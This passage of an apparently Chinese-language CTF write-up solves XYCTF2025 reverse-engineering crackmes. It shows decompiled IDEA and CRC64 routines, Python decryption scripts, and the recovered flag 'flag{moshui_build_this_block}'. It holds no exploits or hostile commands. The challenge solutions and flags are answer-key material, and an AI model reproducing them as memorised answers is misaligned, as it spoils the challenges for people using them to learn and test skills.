<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        crc = i<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            <span class="hljs-keyword">if</span> crc &amp; <span class="hljs-number">1</span>:<br>                crc = (crc &gt;&gt; <span class="hljs-number">1</span>) ^ <span class="hljs-number">0xEDB88321</span><br>            <span class="hljs-keyword">else</span>:<br>                crc &gt;&gt;= <span class="hljs-number">1</span><br>        table.append(crc)<br>    <span class="hljs-keyword">return</span> table<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crc_variant</span>(<span class="hljs-params">data, table</span>):<br>    result = <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> data:<br>        result ^= table[(b ^ (result &amp; <span class="hljs-number">0xFF</span>))]<br>        result = ~result &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> result<br><br>data = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x66</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x67</span>])<br><br>part1 = data[:<span class="hljs-number">5</span>]<br>part2 = data[<span class="hljs-number">5</span>:]<br><br>crc_table = build_crc32_table()<br><br>key0 = crc_variant(part1, crc_table)<br>key1 = <span class="hljs-number">0x12345678</span><br>key2 = crc_variant(part2, crc_table)<br>key3 = <span class="hljs-number">0x89ABCDEF</span><br><br>key = [key0, key1, key2, key3]<br><span class="hljs-built_in">print</span>([<span class="hljs-built_in">hex</span>(k) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> key])<br><br><span class="hljs-comment"># [&#x27;0x42b2986c&#x27;, &#x27;0x12345678&#x27;, &#x27;0xe40ecf0a&#x27;, &#x27;0x89abcdef&#x27;]</span><br></code></pre></td></tr></table></figure><p><strong>密钥</strong> ：0x42b2986c，0x12345678，0xe40ecf0a，0x89abcdef<br>同时在里面发现sub_xxx1500<br><code>sub_7FF7AD961500(v6, *(_QWORD *)(v5 + 8) + 12LL, 16LL, v8);</code><br>分析后可知 a1 传入的是原始密钥<br><img src="/../images/XYCTF2025/cr9.png"><br>sub_xxx1FF0 :将128位原始密钥扩展为52个16位轮密钥（符合IDEA标准）<br><img src="/../images/XYCTF2025/cr10.png"><br>sub_xxx1640 :<strong>IDEA 加密</strong></p><blockquote><p>分组长度：64 位<br>密钥长度：128 位<br>共 8 轮 + 1 次输出变换<br>每轮用到了三种不同的运算：<br>模 2¹⁶ 加法（模加）<br>模 2¹⁶ + 1 乘法（模乘）<br>按位异或 XOR</p></blockquote><p>主要特点包括使用模乘（模65537）和模加（模65536）运算，以及大量的异或操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_7FF7AD961640</span><span class="hljs-params">(</span><br><span class="hljs-params">    <span class="hljs-type">unsigned</span> __int16 *a1,  <span class="hljs-comment">// 输入块（4×16位）</span></span><br><span class="hljs-params">    _WORD *a2,             <span class="hljs-comment">// 输出块（4×16位）</span></span><br><span class="hljs-params">    <span class="hljs-type">unsigned</span> __int16 *a3   <span class="hljs-comment">// 轮密钥数组</span></span><br><span class="hljs-params">)</span> <br> <span class="hljs-comment">// 输入块字节序转换（小端→主机序）</span><br>    v4 = (*a1 &lt;&lt; <span class="hljs-number">8</span>) | (*a1 &gt;&gt; <span class="hljs-number">8</span>);   <span class="hljs-comment">// 字1</span><br>    v7 = (a1[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">8</span>) | (a1[<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">8</span>); <span class="hljs-comment">// 字2</span><br>    v12 = (a1[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">8</span>) | (a1[<span class="hljs-number">2</span>] &gt;&gt; <span class="hljs-number">8</span>); <span class="hljs-comment">// 字3</span><br>    v18 = (a1[<span class="hljs-number">3</span>] &lt;&lt; <span class="hljs-number">8</span>) | (a1[<span class="hljs-number">3</span>] &gt;&gt; <span class="hljs-number">8</span>); <span class="hljs-comment">// 字4</span><br><br>    <span class="hljs-comment">// 8轮混淆操作（每轮用6个子密钥）</span><br>    v24 = <span class="hljs-number">8</span>; <span class="hljs-comment">// 轮计数器</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-comment">// 模乘操作 (mod 0x10001) + 加法/异或</span><br>        v5 = modmul(*a3++, v4);   <span class="hljs-comment">// 轮密钥与v4模乘</span><br>        v8 = *a3++ + v7;          <span class="hljs-comment">// 轮密钥与v7模加</span><br>        v13 = *a3++ + v12;         <span class="hljs-comment">// 轮密钥与v12模加</span><br>        v19 = modmul(*a3++, v18); <span class="hljs-comment">// 轮密钥与v18模乘</span><br>        v14 = v5 ^ v13;<br>        v15 = modmul(*a3++, v14); <span class="hljs-comment">// 轮密钥与v14模乘</span><br>        v9 = v15 + (v19 ^ v8);<br>        v10 = modmul(*a3++, v9);  <span class="hljs-comment">// 轮密钥与v9模乘</span><br>        v16 = v10 + v15;<br>        <span class="hljs-comment">// 状态更新</span><br>        v4 = v10 ^ v5;<br>        v7 = v13 ^ v10;   <span class="hljs-comment">// 下一轮v7</span><br>        v12 = v8 ^ v16;   <span class="hljs-comment">// 下一轮v12</span><br>        v18 = v16 ^ v19;  <span class="hljs-comment">// 下一轮v18</span><br>    &#125; <span class="hljs-keyword">while</span> (--v24);<br><br>    <span class="hljs-comment">// 最终轮（4个子密钥）</span><br>    v6 = modmul(*a3++, v4);<br>    v17 = *a3++ + v12;<br>    v11 = *a3++ + v7;<br>    v20 = modmul(*a3, v18);<br><br>    <span class="hljs-comment">// 输出字节序转换（主机序→小端）</span><br>    *a2 = (v6 &lt;&lt; <span class="hljs-number">8</span>) | (v6 &gt;&gt; <span class="hljs-number">8</span>);<br>    a2[<span class="hljs-number">1</span>] = (v17 &lt;&lt; <span class="hljs-number">8</span>) | (v17 &gt;&gt; <span class="hljs-number">8</span>);<br>    a2[<span class="hljs-number">2</span>] = (v11 &lt;&lt; <span class="hljs-number">8</span>) | (v11 &gt;&gt; <span class="hljs-number">8</span>);<br>    a2[<span class="hljs-number">3</span>] = (v20 &lt;&lt; <span class="hljs-number">8</span>) | (v20 &gt;&gt; <span class="hljs-number">8</span>);<br></code></pre></td></tr></table></figure><p>密文在 v7 数组中：<br><img src="/../images/XYCTF2025/cr12.png"><br>解出第二部分:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs py">sub_key = [<span class="hljs-number">0</span>] * <span class="hljs-number">52</span><br>inv_sub_key = [<span class="hljs-number">0</span>] * <span class="hljs-number">52</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">plus</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">return</span> (a + b) &amp; <span class="hljs-number">0xFFFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">times</span>(<span class="hljs-params">a, b</span>):<br>    a = a <span class="hljs-keyword">if</span> a != <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0x10000</span><br>    b = b <span class="hljs-keyword">if</span> b != <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0x10000</span><br>    r = (a * b) % <span class="hljs-number">0x10001</span><br>    <span class="hljs-keyword">return</span> r <span class="hljs-keyword">if</span> r != <span class="hljs-number">0x10000</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">return</span> a ^ b<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inv_plus</span>(<span class="hljs-params">a</span>):<br>    <span class="hljs-keyword">return</span> (-a) &amp; <span class="hljs-number">0xFFFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inv_times</span>(<span class="hljs-params">a</span>):<br>    <span class="hljs-keyword">if</span> a == <span class="hljs-number">0</span>: <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(a, -<span class="hljs-number">1</span>, <span class="hljs-number">0x10001</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">subkeys_get</span>(<span class="hljs-params">keys_input</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        sub_key[i] = keys_input[i]<br><br>    main_key = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        main_key = (main_key &lt;&lt; <span class="hljs-number">16</span>) | keys_input[i]<br><br>    mask128 = (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">128</span>) - <span class="hljs-number">1</span><br>    <br>    key_offset = <span class="hljs-number">8</span> <br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        main_key = ((main_key &lt;&lt; <span class="hljs-number">25</span>) | (main_key &gt;&gt; <span class="hljs-number">103</span>)) &amp; mask128<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            sub_key[key_offset + j] = (main_key &gt;&gt; (<span class="hljs-number">112</span> - <span class="hljs-number">16</span> * j)) &amp; <span class="hljs-number">0xFFFF</span><br>        key_offset += <span class="hljs-number">8</span><br><br>    main_key = ((main_key &lt;&lt; <span class="hljs-number">25</span>) | (main_key &gt;&gt; <span class="hljs-number">103</span>)) &amp; mask128<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        sub_key[<span class="hljs-number">48</span> + i] = (main_key &gt;&gt; (<span class="hljs-number">112</span> - <span class="hljs-number">16</span> * i)) &amp; <span class="hljs-number">0xFFFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inv_subkeys_get</span>(<span class="hljs-params">sub_key_list</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>, <span class="hljs-number">48</span>, <span class="hljs-number">6</span>):<br>        inv_sub_key[i] = inv_times(sub_key_list[<span class="hljs-number">48</span> - i])<br>        inv_sub_key[i + <span class="hljs-number">1</span>] = inv_plus(sub_key_list[<span class="hljs-number">50</span> - i])<br>        inv_sub_key[i + <span class="hljs-number">2</span>] = inv_plus(sub_key_list[<span class="hljs-number">49</span> - i])<br>        inv_sub_key[i + <span class="hljs-number">3</span>] = inv_times(sub_key_list[<span class="hljs-number">51</span> - i])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">48</span>, <span class="hljs-number">6</span>):<br>        inv_sub_key[i + <span class="hljs-number">4</span>] = sub_key_list[<span class="hljs-number">46</span> - i]<br>        inv_sub_key[i + <span class="hljs-number">5</span>] = sub_key_list[<span class="hljs-number">47</span> - i]<br>    inv_sub_key[<span class="hljs-number">0</span>] = inv_times(sub_key_list[<span class="hljs-number">48</span>])<br>    inv_sub_key[<span class="hljs-number">1</span>] = inv_plus(sub_key_list[<span class="hljs-number">49</span>])<br>    inv_sub_key[<span class="hljs-number">2</span>] = inv_plus(sub_key_list[<span class="hljs-number">50</span>])<br>    inv_sub_key[<span class="hljs-number">3</span>] = inv_times(sub_key_list[<span class="hljs-number">51</span>])<br>    inv_sub_key[<span class="hljs-number">48</span>] = inv_times(sub_key_list[<span class="hljs-number">0</span>])<br>    inv_sub_key[<span class="hljs-number">49</span>] = inv_plus(sub_key_list[<span class="hljs-number">1</span>])<br>    inv_sub_key[<span class="hljs-number">50</span>] = inv_plus(sub_key_list[<span class="hljs-number">2</span>])<br>    inv_sub_key[<span class="hljs-number">51</span>] = inv_times(sub_key_list[<span class="hljs-number">3</span>])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dencrypt_final</span>(<span class="hljs-params">cipher_block</span>):<br>    i1, i2, i3, i4 = (cipher_block &gt;&gt; <span class="hljs-number">48</span>)&amp;<span class="hljs-number">0xFFFF</span>, (cipher_block &gt;&gt; <span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xFFFF</span>, (cipher_block &gt;&gt; <span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xFFFF</span>, cipher_block&amp;<span class="hljs-number">0xFFFF</span><br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">48</span>, <span class="hljs-number">6</span>):<br>        t1, t2, t3, t4 = times(i1, inv_sub_key[i]), plus(i2, inv_sub_key[i+<span class="hljs-number">1</span>]), plus(i3, inv_sub_key[i+<span class="hljs-number">2</span>]), times(i4, inv_sub_key[i+<span class="hljs-number">3</span>])<br>        t5, t6 = xor(t1, t3), xor(t2, t4)<br>        t7 = times(t5, inv_sub_key[i+<span class="hljs-number">4</span>])<br>        t8 = plus(t6, t7)<br>        t9 = times(t8, inv_sub_key[i+<span class="hljs-number">5</span>])<br>        t10 = plus(t7, t9)        <br>        <br>        i1 = xor(t1, t9)<br>        i2 = xor(t3, t9)   <br>        i3 = xor(t2, t10)  <br>        i4 = xor(t4, t10)    <br>    <br>    y1 = times(i1, inv_sub_key[<span class="hljs-number">48</span>])<br>    y2 = plus(i3, inv_sub_key[<span class="hljs-number">49</span>])  <span class="hljs-comment"># 注意：这里I3和I2是交换使用的，这是非标准部分</span><br>    y3 = plus(i2, inv_sub_key[<span class="hljs-number">50</span>])  <span class="hljs-comment"># 注意：这里I3和I2是交换使用的，这是非标准部分</span><br>    y4 = times(i4, inv_sub_key[<span class="hljs-number">51</span>])<br>    <br>    <span class="hljs-keyword">return</span> (y1 &lt;&lt; <span class="hljs-number">48</span>) | (y2 &lt;&lt; <span class="hljs-number">32</span>) | (y3 &lt;&lt; <span class="hljs-number">16</span>) | y4<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    part2 = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x5C</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x90</span>])<br>    key_data = [<span class="hljs-number">0x6C98B242</span>, <span class="hljs-number">0x78563412</span>, <span class="hljs-number">0x3E6A6D0D</span>, <span class="hljs-number">0xEFCDAB89</span>] <span class="hljs-comment"># 端序转换</span><br>    keys_input = [val <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> key_data <span class="hljs-keyword">for</span> val <span class="hljs-keyword">in</span> [(k &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFF</span>, k &amp; <span class="hljs-number">0xFFFF</span>]]<br>    <br>    cipher1 = <span class="hljs-built_in">int</span>.from_bytes(part2[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>], <span class="hljs-string">&#x27;big&#x27;</span>)<br>    cipher2 = <span class="hljs-built_in">int</span>.from_bytes(part2[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>], <span class="hljs-string">&#x27;big&#x27;</span>)<br>    <br>    subkeys_get(keys_input)<br>    inv_subkeys_get(sub_key)<br>    <br>    plain1 = dencrypt_final(cipher1)<br>    plain2 = dencrypt_final(cipher2)<br>    <br>    p1_bytes, p2_bytes = plain1.to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;big&#x27;</span>), plain2.to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;big&#x27;</span>)<br>    <br>    result_bytes = p1_bytes + p2_bytes<br>    <br>    hex_output = <span class="hljs-string">&#x27; &#x27;</span>.join(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;b:02X&#125;</span>&#x27;</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> result_bytes)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decrypted bytes (hex): <span class="hljs-subst">&#123;hex_output&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        str_output = result_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decrypted string       : <span class="hljs-subst">&#123;str_output&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">except</span> UnicodeDecodeError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decrypted string (raw) : <span class="hljs-subst">&#123;result_bytes!r&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># Decrypted bytes (hex): 62 75 69 6C 64 5F 74 68 69 73 5F 62 6C 6F 63 6B </span><br><span class="hljs-comment"># Decrypted string      : build_this_block</span><br></code></pre></td></tr></table></figure><p>所以第一部分的 moshui_ 和第二部分的 build_this_block 拼接起来就是完整的 <code>flag&#123;moshui_build_this_block&#125;</code></p><h3 id="Dragon"><a href="#Dragon" class="headerlink" title="Dragon"></a>Dragon</h3><p>附件是一个 .bc 文件，用 <code>file Dragon.bc</code> 查看文件类型<br>得到<code>Dragon.bc: LLVM IR bitcode</code><br>继续往下编译 <code>clang Dragon.bc -o Dragon</code><br>然后 ida 打开编译好的 Dragon 文件,main 函数<br>读取输入后进入一个加密函数(CRC 64)，最后又字符串比较,动调提取出密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">data=[ <span class="hljs-number">0x47</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xBF</span>, <br>  <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x62</span>, <br>  <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xB6</span>, <br>  <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xFC</span>, <br>  <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xC3</span>, <br>  <span class="hljs-number">0x73</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x38</span>, <br>  <span class="hljs-number">0x27</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xE6</span>, <br>  <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x92</span>, <br>  <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x3A</span>, <br>  <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x9B</span>]<br></code></pre></td></tr></table></figure><p>密文有 96 字节 -&gt; 12 个 64 位整数，每两个字符为一组，生成一个 64 位的 CRC 值，与密文对比<br>因此可以得出输入是 24 个字符，需要爆破 12 组的 2 字符组合<br>加密函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_7FF6EA4B1000</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1, <span class="hljs-type">unsigned</span> __int64 n2)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 n8; <span class="hljs-comment">// [rsp+0h] [rbp-28h]</span><br>  <span class="hljs-type">unsigned</span> __int64 n2_1; <span class="hljs-comment">// [rsp+8h] [rbp-20h]</span><br>  __int64 v5; <span class="hljs-comment">// [rsp+10h] [rbp-18h]</span><br><br>  v5 = <span class="hljs-number">-1</span>;  <span class="hljs-comment">//0xFFFFFFFFFFFFFFFF</span><br>  <span class="hljs-keyword">for</span> ( n2_1 = <span class="hljs-number">0</span>; n2_1 &lt; n2; ++n2_1 )           <span class="hljs-comment">// n2=2</span><br>  &#123;<br>    v5 ^= (<span class="hljs-type">unsigned</span> __int64)(<span class="hljs-type">unsigned</span> __int8)a1[n2_1] &lt;&lt; <span class="hljs-number">56</span>;<br>    <span class="hljs-keyword">for</span> ( n8 = <span class="hljs-number">0</span>; n8 &lt; <span class="hljs-number">8</span>; ++n8 )  <span class="hljs-comment">//每个字节处理 8 位</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v5 &gt;= <span class="hljs-number">0</span> ) <span class="hljs-comment">//相当于 v5 &amp; (1 &lt;&lt; 63) == 0</span><br>        v5 *= <span class="hljs-number">2</span>;<br>      <span class="hljs-keyword">else</span><br>        v5 = (<span class="hljs-number">2</span> * v5) ^ <span class="hljs-number">0x42F0E1EBA9EA3693L</span>L;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> ~v5;<br>&#125;<br></code></pre></td></tr></table></figure><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python">data=[ <span class="hljs-number">0x47</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xBF</span>, <br>  <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xF8</span>, <span 